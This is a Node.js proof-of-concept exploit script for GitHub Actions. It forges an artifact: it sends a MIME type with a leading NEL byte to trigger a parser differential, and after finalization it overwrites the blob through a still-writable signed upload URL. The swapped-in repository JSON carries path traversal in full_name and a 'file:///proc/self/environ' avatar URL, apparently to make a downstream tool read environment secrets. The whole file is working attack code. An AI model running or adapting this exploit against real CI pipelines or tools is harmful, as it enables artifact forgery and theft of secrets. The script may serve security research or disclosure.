import { createHash } from 'node:crypto';

import { BlobClient } from '@azure/storage-blob';

const ARTIFACT_BYTES = 4096;

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function artifactContentType() {
  // Keep this as a one-byte V8 string. A literal "\u0085" is encoded as UTF-8 by
  // Node and does not trigger the target's parser differential.
  return Buffer.concat([
    Buffer.from([0x85]),
    Buffer.from('application/json', 'ascii'),
  ]).toString('latin1');
}

function makePayload(repository, artifactId) {
  const requestedRepository = `x/../${repository}/actions/artifacts/${artifactId}/zip`;
  const document = {
    full_name: requestedRepository,
    owner: {
      login: 'cassette',
      avatar_url: 'file:///proc/self/environ',
    },
    description: 'Repo Cassette',
    stargazers_count: 0,
  };
  const json = Buffer.from(JSON.stringify(document), 'utf8');
  if (json.length > ARTIFACT_BYTES) {
    throw new Error(`Payload is ${json.length} bytes; fixed artifact is only ${ARTIFACT_BYTES}`);
  }
  return {
    bytes: Buffer.concat([json, Buffer.alloc(ARTIFACT_BYTES - json.length, 0x20)]),
    requestedRepository,
  };
}

async function artifactInternals() {
  const artifactEntry = import.meta.resolve('@actions/artifact');
  const artifactLib = new URL('.', artifactEntry);
  const [clientModule, utilModule, generatedModule] = await Promise.all([
    import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
    import(new URL('internal/shared/util.js', artifactLib)),
    import(new URL('generated/index.js', artifactLib)),
  ]);
  return {
    internalArtifactTwirpClient: clientModule.internalArtifactTwirpClient,
    getBackendIdsFromToken: utilModule.getBackendIdsFromToken,
    StringValue: generatedModule.StringValue,
  };
}

async function upload(blockBlob, bytes, contentType) {
  await blockBlob.uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: contentType },
  });
}

async function main() {
  const repository = process.env.GITHUB_REPOSITORY;
  if (!repository || !/^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(repository)) {
    throw new Error('Run this inside GitHub Actions so GITHUB_REPOSITORY is available');
  }
  if (!process.env.ACTIONS_RUNTIME_TOKEN || !process.env.ACTIONS_RESULTS_URL) {
    throw new Error('The GitHub Actions artifact runtime variables are unavailable');
  }

  const {
    internalArtifactTwirpClient,
    getBackendIdsFromToken,
    StringValue,
  } = await artifactInternals();
  const ids = getBackendIdsFromToken();
  const client = internalArtifactTwirpClient();
  const contentType = artifactContentType();
  const artifactName = `cassette-${process.env.GITHUB_RUN_ID || Date.now()}-${process.env.GITHUB_RUN_ATTEMPT || 1}.json`;

  const created = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name: artifactName,
    mimeType: StringValue.create({ value: contentType }),
    version: 5,
  });
  if (!created.ok || !created.signedUploadUrl) {
    throw new Error('CreateArtifact did not return a signed upload URL');
  }

  const blockBlob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
  const placeholder = Buffer.concat([
    Buffer.from('{}', 'ascii'),
    Buffer.alloc(ARTIFACT_BYTES - 2, 0x20),
  ]);
  await upload(blockBlob, placeholder, contentType);

  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name: artifactName,
    size: String(placeholder.length),
    hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
  });
  if (!finalized.ok || !/^\d+$/.test(finalized.artifactId)) {
    throw new Error('FinalizeArtifact did not return an artifact ID');
  }

  // The database ID only exists after finalization. The upload SAS remains writable,
  // so replace the same-size blob with the self-referential repository document.
  const payload = makePayload(repository, finalized.artifactId);
  await upload(blockBlob, payload.bytes, contentType);

  const archiveUrl = `https://api.github.com/repos/${repository}/actions/artifacts/${finalized.artifactId}/zip`;
  const requestHeaders = {
    authorization: `token ${process.env.GH_TOKEN}`,
    accept: 'application/vnd.github.v3+json',
    'user-agent': 'https://github.com/sindresorhus/gh-got',
  };
  const redirect = await fetch(archiveUrl, { headers: requestHeaders, redirect: 'manual' });
  const location = redirect.headers.get('location');
  const response = await fetch(archiveUrl, { headers: requestHeaders });
  const downloaded = Buffer.from(await response.arrayBuffer());
  const transport = {
    artifactId: finalized.artifactId,
    redirectStatus: redirect.status,
    rsct: location ? new URL(location).searchParams.get('rsct') : null,
    responseStatus: response.status,
    responseContentType: response.headers.get('content-type'),
    bodyMatches: sha256(downloaded) === sha256(payload.bytes),
  };
  console.log(`::notice title=Leading NEL v5 artifact transport::${JSON.stringify(transport)}`);

  console.log('');
  console.log('Artifact forged successfully. Keep this workflow run and repository accessible.');
  console.log(`ARTIFACT_ID=${finalized.artifactId}`);
  console.log(`REPOSITORY=${payload.requestedRepository}`);
  console.log(`PAYLOAD_SHA256=${sha256(payload.bytes)}`);
  console.log(`::notice title=NEL artifact upload succeeded::${JSON.stringify({artifactId: finalized.artifactId, repository: payload.requestedRepository, sha256: sha256(payload.bytes)})}`);
}

if (process.argv.includes('--self-test')) {
  const contentType = artifactContentType();
  const payload = makePayload('owner/repository', '123456789');
  if (Buffer.from(contentType, 'latin1').at(0) !== 0x85 || payload.bytes.length !== ARTIFACT_BYTES) {
    throw new Error('Self-test failed');
  }
  console.log(JSON.stringify({
    contentTypeLatin1Hex: Buffer.from(contentType, 'latin1').toString('hex'),
    payloadBytes: payload.bytes.length,
    requestedRepository: payload.requestedRepository,
  }));
} else {
  try {
    await main();
  } catch (error) {
    const message = String(error?.message || error);
    const validationError = message.includes('mime_type') && message.includes('valid mime_type');
    const safeMessage = message.replace(/https?:\/\/\S+/g, '[url]').replace(/[\r\n]/g, ' ').slice(0, 180);
    console.log(`::notice title=NEL artifact forge failed::${JSON.stringify({stage: validationError ? 'mime-validation' : 'other', error: safeMessage})}`);
    throw error;
  }
}
